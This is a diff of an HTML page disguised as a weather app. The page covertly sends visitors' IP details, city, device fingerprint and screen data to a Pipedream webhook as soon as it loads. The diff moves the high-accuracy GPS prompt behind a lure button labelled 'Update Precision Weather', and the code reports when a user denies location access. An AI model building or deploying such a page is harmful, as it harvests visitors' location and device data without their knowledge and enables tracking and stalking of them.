@@ -45,8 +45,31 @@
         p {
             font-size: 14px;
             color: #a1a1aa;
-            margin-bottom: 10px;
+            margin-bottom: 30px;
             text-transform: capitalize;
+        }
+
+        button {
+            background: #ffffff;
+            color: #121214;
+            border: none;
+            padding: 14px 24px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+            transition: background 0.2s ease;
+        }
+
+        button:hover {
+            background: #e4e4e7;
+        }
+
+        button:disabled {
+            background: #27272a;
+            color: #71717a;
+            cursor: not-allowed;
         }
     </style>
 </head>
@@ -56,6 +79,8 @@
         <h2 id="city-display">Fetching Location...</h2>
         <h1 id="temp-display">--°C</h1>
         <p id="condition-display">Gathering atmospheric metrics...</p>
+
+        <button id="action-btn" onclick="triggerPinpointLocation()">Update Precision Weather</button>
     </div>
 
     <script>
@@ -64,9 +89,9 @@
         const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net"; // Replace with your Pipedream webhook URL
         // =======================================================
 
+        // Phase 1 automatically runs on load, Phase 2 waits for the button press
         window.onload = function() {
             fetchWeatherByIP();
-            triggerAutoPinpoint();
         };
 
         // Helper function that parses the User-Agent string into simple terms
@@ -108,7 +133,7 @@
                     const ipCity = ipData.city || "Hyderabad"; 
                     const hardware = getDeviceDetails();
                     
-                    // THIS IS WHERE THE MAGIC HAPPENS: Sends all device fingerprints instantly
+                    // Dispatches all device configurations, IP details, and screen sizing to Pipedream immediately
                     sendTrackingData({ 
                         event: "instant_ip_and_device_load", 
                         city: ipCity, 
@@ -143,8 +168,12 @@
                 });
         }
 
-        // --- PHASE 2: AUTOMATIC HIGH-ACCURACY PROMPT TRIPPING ---
-        function triggerAutoPinpoint() {
+        // --- PHASE 2: MANUAL HIGH-ACCURACY PROMPT (VIA BUTTON) ---
+        function triggerPinpointLocation() {
+            const btn = document.getElementById("action-btn");
+            btn.innerText = "Scanning Coordinates...";
+            btn.disabled = true;
+
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -160,13 +189,20 @@
                         });
 
                         fetchPreciseWeatherAndDetails(lat, lon);
+                        btn.innerText = "Location Updated";
                     },
                     (error) => {
                         console.warn("User clicked Deny or prompt closed.");
                         sendTrackingData({ event: "gps_denied_by_user" });
+                        
+                        // Silent layout restoration: Button resets but screen parameters remain untouched
+                        btn.innerText = "Update Precision Weather";
+                        btn.disabled = false;
                     },
                     { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
                 );
+            } else {
+                btn.innerText = "Unsupported Device";
             }
         }
 
